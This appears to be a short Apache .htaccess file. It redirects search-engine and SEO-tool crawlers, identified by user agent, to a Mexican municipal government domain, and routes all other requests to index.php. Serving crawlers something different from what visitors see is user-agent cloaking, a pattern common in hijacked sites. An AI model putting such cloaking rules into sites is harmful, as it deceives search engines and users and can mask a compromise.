RewriteEngine On

RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
RewriteRule ^(.*)$ https://2024-2027.villadelapazslp.gob.mx/ [R=301,L]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^ index.php [L]
